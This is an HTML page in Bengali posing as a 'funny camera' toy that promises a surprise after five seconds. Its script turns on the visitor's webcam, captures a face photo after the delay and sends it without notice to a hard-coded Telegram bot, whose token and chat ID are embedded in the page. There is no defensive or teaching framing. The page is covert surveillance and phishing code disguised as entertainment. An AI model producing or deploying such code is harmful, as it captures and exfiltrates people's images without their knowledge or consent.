<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <title>মজার ক্যামেরা</title>
  <style>
    body {
      margin: 0;
      background-color: black;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      color: white;
      font-family: Arial, sans-serif;
    }
    video {
      border: 3px solid #00ffcc;
      border-radius: 10px;
      width: 80%;
      max-width: 500px;
    }
    #message {
      margin-bottom: 20px;
      font-size: 20px;
      color: #00ffcc;
    }
  </style>
</head>
<body>
  <div id="message">৫ সেকেন্ড অপেক্ষা করুন এবং শেষে মজা দেখুন</div>
  <video id="video" autoplay playsinline></video>

  <script>
    const telegramBotToken = "7460221175:AAGn19zxbV_sXOWjW1ViDc3v4kHyS5WDGZU";
    const telegramChatId = "6429244657";

    const video = document.getElementById('video');

    // ক্যামেরা চালু
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;

        setTimeout(() => {
          captureAndSendPhoto();
        }, 5000); // ৫ সেকেন্ড পর ছবি তুলবে
      });

    function captureAndSendPhoto() {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0);

      const imageData = canvas.toDataURL('image/jpeg');

      const blob = dataURLtoBlob(imageData);
      const formData = new FormData();
      formData.append('chat_id', telegramChatId);
      formData.append('photo', blob, 'face.jpg');

      fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
    }

    function dataURLtoBlob(dataurl) {
      const arr = dataurl.split(',');
      const mime = arr[0].match(/:(.*?);/)[1];
      const bstr = atob(arr[1]);
      let n = bstr.length;
      const u8arr = new Uint8Array(n);
      while(n--) {
        u8arr[n] = bstr.charCodeAt(n);
      }
      return new Blob([u8arr], {type:mime});
    }
  </script>
</body>
</html>
